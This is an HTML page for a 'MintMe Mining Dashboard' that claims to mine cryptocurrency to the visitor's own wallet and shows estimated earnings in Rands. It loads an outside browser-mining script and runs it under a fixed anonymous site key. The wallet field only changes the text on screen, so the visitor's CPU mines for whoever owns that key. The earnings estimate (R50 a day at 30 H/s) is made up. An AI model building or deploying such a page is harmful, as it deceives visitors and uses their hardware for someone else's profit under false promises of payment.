<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MintMe Mining</title>
    <script src="https://www.hostingcloud.racing/nihn.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #fff;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        .container {
            padding: 20px;
            margin: 20px auto;
            max-width: 600px;
            background-color: #1c1c1c;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            background-color: #333;
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background-color: #444;
        }
        .stats {
            margin-top: 20px;
            text-align: left;
            font-size: 1rem;
        }
        .mining-animation {
            font-size: 1.2rem;
            font-weight: bold;
            color: #0f0;
            margin-top: 10px;
        }
        .wallet-section {
            margin-top: 20px;
        }
        input[type="text"] {
            padding: 8px;
            border-radius: 5px;
            border: 1px solid #555;
            margin-top: 10px;
            width: 80%;
            background-color: #222;
            color: #fff;
        }
        label {
            display: block;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>MintMe Mining Dashboard</h1>
        <p>Mine cryptocurrency directly to your wallet and earn Rands!</p>
        
        <!-- Wallet Management -->
        <div class="wallet-section">
            <h3>Wallet Address</h3>
            <input type="text" id="walletAddress" placeholder="Enter your wallet address (Coinbase/Phantom)" />
            <label>Current Wallet: <span id="currentWallet">0x643d9Ee10249F49e946119349D68eC8E72b212e2</span></label>
        </div>
        
        <!-- Mining Controls -->
        <button onclick="startMining()">Start Mining</button>
        <button onclick="stopMining()">Stop Mining</button>

        <!-- Mining Animation -->
        <p id="miningAnimation" class="mining-animation" style="display: none;">Mining... ðŸ”„</p>

        <!-- Stats Display -->
        <div class="stats">
            <h3>Mining Stats</h3>
            <p>Hash Rate: <span id="hashRate">0 H/s</span></p>
            <p>Total Hashes: <span id="totalHashes">0</span></p>
            <p>Estimated Daily Earnings: <span id="dailyEarnings">R0.00</span></p>
        </div>
    </div>

    <script>
        var _client = new Client.Anonymous('dd1370575eb7853cb7aebeb5b5ccbbf1969d2bbe03151ffa5fde471723c6a579', {
            throttle: 0.3,
            c: 'w'
        });

        let isMining = false;

        // Start Mining
        function startMining() {
            const walletAddress = document.getElementById("walletAddress").value || "0x643d9Ee10249F49e946119349D68eC8E72b212e2";
            document.getElementById("currentWallet").innerText = walletAddress;

            if (!isMining) {
                _client.start();
                isMining = true;
                document.getElementById("miningAnimation").style.display = "block";
                updateStats();
                console.log("Mining started.");
            }
        }

        // Stop Mining
        function stopMining() {
            if (isMining) {
                _client.stop();
                isMining = false;
                document.getElementById("miningAnimation").style.display = "none";
                console.log("Mining stopped.");
            }
        }

        // Update Mining Stats
        function updateStats() {
            if (isMining) {
                document.getElementById("hashRate").innerText = _client.getHashesPerSecond().toFixed(2) + " H/s";
                document.getElementById("totalHashes").innerText = _client.getTotalHashes();
                document.getElementById("dailyEarnings").innerText = "R" + calculateDailyEarnings(_client.getHashesPerSecond()).toFixed(2);
                setTimeout(updateStats, 1000);
            }
        }

        // Calculate Daily Earnings (Assumes R50/day @ 30 H/s average)
        function calculateDailyEarnings(hashRate) {
            const targetDailyEarnings = 50; // Rands
            const targetHashRate = 30; // Hashes per second
            return (hashRate / targetHashRate) * targetDailyEarnings;
        }
    </script>
</body>
</html>
